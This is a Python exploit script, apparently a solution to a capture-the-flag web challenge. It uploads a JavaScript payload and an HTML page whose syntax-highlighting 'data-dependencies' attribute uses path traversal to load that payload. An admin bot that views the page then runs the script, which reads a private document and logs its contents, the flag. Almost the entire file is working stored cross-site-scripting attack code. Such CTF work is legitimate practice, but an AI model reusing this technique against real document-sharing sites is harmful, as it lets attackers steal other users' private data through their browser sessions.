#!/usr/bin/env python3

import argparse
import secrets
import sys

import requests


def put_doc(session: requests.Session, base: str, doc_id: str, key: str, *, title: str, body: str, language: str) -> None:
    r = session.put(
        f"{base}/api/documents/{doc_id}",
        params={"key": key},
        json={"title": title, "body": body, "language": language},
        timeout=15,
    )
    if not r.ok:
        raise SystemExit(f"failed to create {doc_id}: {r.status_code} {r.text[:200]}")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument(
        "--target",
        default="https://dont-worry-a9d7280b88fc.chall.nnsc.tf",
        help="challenge base URL",
    )
    ap.add_argument("--victim-id", default="welcome", help="document id to read")
    args = ap.parse_args()

    base = args.target.rstrip("/")
    session = requests.Session()

    js_id = f"js{secrets.token_hex(4)}"
    dep_key_seed = secrets.token_hex(8)
    js_key = f"{dep_key_seed}.min.js"
    js_body = f"""
(async () => {{
  console.log("stage", "payload-start");
  try {{
    const r = await fetch("/api/documents/{args.victim_id}?key=x&view=editor", {{
      cache: "force-cache",
    }});
    console.log("FLAGJSON", await r.text());
  }} catch (e) {{
    console.log("ERR", String(e));
  }}
}})();
""".strip()
    put_doc(session, base, js_id, js_key, title="payload-js", body=js_body, language="javascript")

    html_id = f"html{secrets.token_hex(4)}"
    html_key = secrets.token_hex(8)
    dep = f"x/../../../../raw/{js_id}?key={dep_key_seed}"
    html_body = (
        f'<pre><code class="language-markup" data-dependencies="{dep}">'
        "run"
        "</code></pre>"
    )
    put_doc(session, base, html_id, html_key, title="payload-html", body=html_body, language="markup")

    print(f"Submit this path to the admin bot:\n/d/{html_id}#{html_key}")
    print("\nExpected bot console output:")
    print('FLAGJSON {"id":"welcome",...,"body":"<flag>","language":"..."}')
    print("\nIf the bot UI accepts full URLs, use:")
    print(f"{base}/d/{html_id}#{html_key}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
